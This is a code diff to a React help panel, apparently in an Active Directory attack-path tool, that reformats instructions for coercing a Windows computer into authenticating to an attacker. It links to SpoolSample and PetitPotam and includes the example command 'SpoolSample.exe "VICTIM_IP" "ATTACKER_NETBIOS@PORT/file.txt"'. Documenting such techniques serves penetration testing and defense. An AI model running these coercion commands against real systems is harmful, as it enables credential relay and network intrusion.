@@ -14,7 +14,7 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
-import { Typography } from '@mui/material';
+import { Link, Typography } from '@mui/material';
 import { FC } from 'react';
 import { EdgeInfoProps } from '../index';
 
@@ -26,16 +26,31 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
             </Typography>
             <Typography variant='body2'>
                 2: Coerce the Target Computer Several coercion methods are documented here:{' '}
-                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                <Link
+                    target='_blank'
+                    rel='noopener'
+                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                     Windows Coerced Authentication Methods
-                </a>
+                </Link>
                 . Examples of tools include:
-                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
-                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
-                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
-                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
-                "ATTACKER_NETBIOS@PORT/file.txt"
+                <ul>
+                    <li>
+                        <Link target='_blank' rel='noopener' href='https://github.com/leechristensen/SpoolSample'>
+                            SpoolSample
+                        </Link>
+                    </li>
+                    <li>
+                        <Link target='_blank' rel='noopener' href='https://github.com/topotam/PetitPotam'>
+                            PetitPotam
+                        </Link>
+                    </li>
+                </ul>
             </Typography>
+            <Typography variant='body2'>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
+            </Typography>
+            <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
         </>
     );
 };
